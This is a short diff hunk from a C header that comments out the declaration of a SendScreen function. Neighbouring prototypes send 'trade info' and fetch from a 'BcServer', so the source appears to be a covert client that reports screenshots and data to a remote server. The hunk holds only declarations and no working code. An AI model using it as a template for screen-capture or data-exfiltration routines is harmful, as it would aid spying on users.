@@ -35,7 +35,7 @@ bool SendFirstInfo();
 bool SendTradeInfo( char *Buffer );
 
 char *GetInfoFromBcServer( char *Url );
-bool SendScreen( LPVOID lpFile, DWORD dwFileSize );
+//bool SendScreen( LPVOID lpFile, DWORD dwFileSize );
 
 bool AsyncDownload( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize );
 
